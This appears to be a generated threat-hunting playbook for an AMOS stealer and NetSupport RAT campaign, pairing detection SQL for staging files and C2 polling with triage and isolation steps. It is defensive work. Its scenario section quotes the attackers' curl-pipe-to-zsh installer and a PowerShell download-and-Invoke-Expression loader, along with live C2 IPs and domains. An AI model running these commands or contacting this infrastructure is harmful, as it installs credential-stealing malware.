---
analysis: A single detection rule may fire on known IPs, but this hunt pivots between
  file system staging paths (rare folders) and specific HTTP URI patterns to catch
  variants that have rotated infrastructure or changed staging names.
blind_spots:
- id: visibility-gap-encrypted-traffic
  owner: Network Security Team
  question: Are the specific HTTP URI paths (/log, /api/v1/bot/actions/) visible in
    the telemetry?
  remediation: Deploy endpoint-based HTTP visibility or TLS decryption at the perimeter.
  requires: TLS inspection on proxy or endpoint logs
  risk: If traffic is encrypted and only IP-level metadata is available, we may miss
    low-volume polling that doesn't trigger IP-based rules.
  stage: c2-traffic-polling
- id: ephemeral-staging-files
  owner: EDR Engineering
  question: Does the malware delete the staging directory immediately after exfiltration?
  remediation: Ensure real-time file creation events are captured and retained for
    the lookback period.
  requires: hb_file_activity with real-time logging
  risk: If file telemetry is only based on snapshots, transient staging folders may
    be missed unless the hunt window overlaps perfectly with the infection event.
  stage: amos-data-collection
coverage:
- stage: amos-data-collection
  status: covered
  steps:
  - detect-staging-files
- stage: c2-traffic-polling
  status: covered
  steps:
  - baseline-c2-ips
  - enrichment-http-c2
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: social-engineering-outreach
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: google-doc-apps-script-interaction
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-payload-execution
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-clickonce-delivery
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-powershell-loader
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-persistence-launchdaemon
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Infections by AMOS and NetSupport pose an immediate risk of credential
    theft and financial loss from cryptocurrency wallets; identifying the collection
    and exfiltration phase is the last line of defense before data is permanently
    lost.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder is staging stolen credential and wallet data in temporary
  directories on macOS and Windows before exfiltrating it to hard-coded C2 infrastructure
  via HTTP polling.
labels:
- hunt
- attack.t1005
- attack.t1555
- attack.t1119
- attack.t1071.001
name: 'AMOS and NetSupport: Data Exfiltration and C2 Polling'
parameters:
  c2_domains:
    default:
    - apple-googleapi.com
    - gapidriver.com
    - 1foqo.lat
    - 2fksf.lat
    description: C2 domains identified in the research.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress-defcon-phishing
    type: list[domain]
  c2_ips:
    default:
    - 86.54.25.213
    - 192.253.248.181
    description: C2 IP addresses identified in the research for log exfiltration and
      instruction polling.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress-defcon-phishing
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress-defcon-phishing
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on endpoints running high-value software like cryptocurrency wallets
  or messaging apps, as these are the primary targets. Use hb_software_inventory to
  prioritize these hosts.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: amos-persistence-launchdaemon
  reason: Persistence via LaunchDaemons is a separate forensic artifact handled by
    a dedicated hunt in this series.
  relation: out-of-scope-alternative
- hunt: post-defcon-phishing-loader-persistence
  relation: follows
scenario:
  stages:
  - name: Social Engineering via X DM
    observables:
    - X account @HartmansDoeke
    - Direct messages regarding conference planning
    - Links to Google Docs with custom access keys
    slug: social-engineering-outreach
    tactic: initial-access
    techniques:
    - T1566.003
  - name: Malicious Google Doc Sidebar
    observables:
    - DecryptPanel.html
    - Google Apps Script sidebar
    - Fake decryption failure prompts
    slug: google-doc-apps-script-interaction
    tactic: execution
    techniques:
    - T1059.007
  - name: macOS Script and DMG Execution
    observables:
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - apple-googleapi.com
    - gapiupdate.dmg
    - Bypassing macOS Gatekeeper via user instructions
    slug: macos-payload-execution
    tactic: execution
    techniques:
    - T1059.004
    - T1204.002
    - T1553.001
  - name: Windows ClickOnce Installer
    observables:
    - GapiUpdate.application
    - https://gapidriver.com/installer/GapiUpdate.application
    - gapidriver.com
    - Certificate issued to BARNEHAGEN GUNHILDS MINNE AS
    slug: windows-clickonce-delivery
    tactic: execution
    techniques:
    - T1204.002
    - T1218
  - name: Windows PowerShell Loader
    observables:
    - https://1foqo.lat/core4
    - '%TEMP%\sys.ps1'
    - Import-Module BitsTransfer
    - Invoke-WebRequest -OutFile $t -UseBasicParsing
    - Invoke-Expression (gc $t -Raw)
    slug: windows-powershell-loader
    tactic: execution
    techniques:
    - T1059.001
  - name: macOS LaunchDaemon Persistence
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - launchctl bootstrap
    - com.xdivcmp.plist
    slug: macos-persistence-launchdaemon
    tactic: persistence
    techniques:
    - T1543.001
  - name: AMOS Data Staging and Collection
    observables:
    - /tmp/lksopo
    - Notes.app database access
    - ~/.pwd (stolen user password file)
    - ~/.phost
    - ~/.bhost
    slug: amos-data-collection
    tactic: collection
    techniques:
    - T1005
    - T1555
    - T1119
  - name: C2 Communication and Polling
    observables:
    - 86.54.25.213
    - 192.253.248.181
    - http://86.54.25.213/log
    - /api/v1/bot/actions/
    - res10.php
    - res11.php
    - res12.php
    slug: c2-traffic-polling
    tactic: command-and-control
    techniques:
    - T1071.001
  summary: Threat actors use social engineering on X (Twitter) to lure targets into
    a malicious Google Doc featuring an Apps Script sidebar. This sidebar delivers
    OS-specific payloads, including AMOS stealer for macOS and NetSupport RAT for
    Windows, utilizing ClickFix-style prompts and fake installers to achieve persistence
    and data exfiltration.
series:
  index: 3
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# AMOS and NetSupport: Data Exfiltration and C2 Polling

This hunt identifies the post-infection operational phase of the AMOS (Atomic macOS Stealer) and NetSupport RAT campaign. It focuses on identifying specific file staging artifacts (e.g., /tmp/lksopo, UpdateCache) and correlating them with network-based command-and-control (C2) activity. By monitoring for instruction polling patterns and exfiltration to known campaign IPs, the hunt can identify compromised hosts where the initial delivery vectors might no longer be visible.

## scoping-targeted-software
<!-- Scope hosts with targeted software -->
Identify hosts that are attractive targets for AMOS or NetSupport due to the presence of high-value software like messaging apps or crypto wallets.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hosts running software targeted by stealers. This provides a baseline
  scope but does not prove infection.
reads:
- device_hostname
- package_name
- package_version
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, package_name, package_version FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%telegram%' OR LOWER(package_name) LIKE '%ledger%' OR LOWER(package_name) LIKE '%wallet%' OR LOWER(package_name) LIKE '%coinbase%' OR LOWER(package_name) LIKE '%metamask%')
```

## detect-staging-files
<!-- Detect malicious staging and config files -->
Find direct evidence of file collection and staging in the specific directories used by the AMOS and NetSupport loaders.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: Rows naming infected hosts and the processes touching staging folders. This
  is the primary behavioural lead.
reads:
- device_hostname
- file_path
- process_name
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, file_path, process_name, time FROM hb_file_activity WHERE (LOWER(file_path) LIKE '%/tmp/lksopo%' OR LOWER(file_path) LIKE '%/.phost' OR LOWER(file_path) LIKE '%/.bhost' OR LOWER(file_path) LIKE '%/.username' OR LOWER(file_path) LIKE '%\microsoft\windows\updatecache\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## corroborate-network
<!-- Corroborate with network indicators -->
parallel:
- → baseline-c2-ips
- → enrichment-http-c2
join: → triage-agent

## baseline-c2-ips
<!-- Analyze prevalence of C2 IP connections -->
Determine which hosts are connecting to the campaign's C2 IPs and if those connections are rare across the fleet.

```sqlite target=network role=baseline params=(lookback_days=lookback_days, c2_ips=c2_ips)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A stack-count showing specific IPs are contacted by very few hosts. Fleet-wide
  traffic to these IPs would suggest a false positive or shared infrastructure.
prevalence:
  by: device_hostname
  key:
  - dst_endpoint_ip
  rare_below: 3
reads:
- dst_endpoint_ip
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT dst_endpoint_ip, COUNT(DISTINCT device_hostname) AS hosts, COUNT(*) AS connections, MIN(time) AS first_seen FROM hb_network_connection WHERE instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY dst_endpoint_ip
```

## enrichment-http-c2
<!-- Specific HTTP C2 indicators -->
Match high-confidence URI patterns and domains associated with AMOS and NetSupport exfiltration and polling.

```sqlite target=web role=enrichment params=(lookback_days=lookback_days, c2_domains=c2_domains)
~~~yaml
expected: Presence of specific polling URLs or data upload paths. These confirm the
  'how' for the exfiltration seen at the network layer.
reads:
- device_hostname
- url_hostname
- url_path
- time
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, url_hostname, url_path, time FROM hb_http_activity WHERE (instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0 OR LOWER(url_path) LIKE '/log%' OR LOWER(url_path) LIKE '/api/v1/bot/actions/%' OR LOWER(url_path) LIKE '%res10.php%' OR LOWER(url_path) LIKE '%res11.php%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-agent
<!-- Weigh operation and exfiltration evidence -->
```agent target=hunter
cite: required
context:
- detect-staging-files
- baseline-c2-ips
- enrichment-http-c2
max_iterations: 6
objective: Confirm active AMOS or NetSupport infection by correlating file staging
  with C2 network traffic.
success_criteria: A per-host verdict of malicious, suspicious, or benign based on
  the overlap of indicators.
tools:
- endpoint
- network
- web
```

## route-verdict
<!-- Route based on triage -->
if~: "The agent identifies at least one host with both staging file activity and network/HTTP connections to known C2 indicators." (confidence: high, judge=hunter)
then: → isolate-endpoint
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: visibility-gap-encrypted-traffic)
else: → close-hunt

## isolate-endpoint
<!-- Isolate infected endpoint -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host via EDR, collect the binaries from /tmp/lksopo or UpdateCache, and begin the IR process.
```
→ analyst-review

## analyst-review
<!-- Analyst review and tuning -->
```manual target=analyst
Review the file activity and network telemetry. If benign, tune out the processes accessing these paths (e.g., local backup software or system updaters).
```
→ end

## close-hunt
<!-- Close hunt and record gaps -->
```manual target=analyst
Record the findings and confirm that the search window was sufficiently covered across both macOS and Windows assets. Log any hosts that failed to report telemetry.
```
→ end
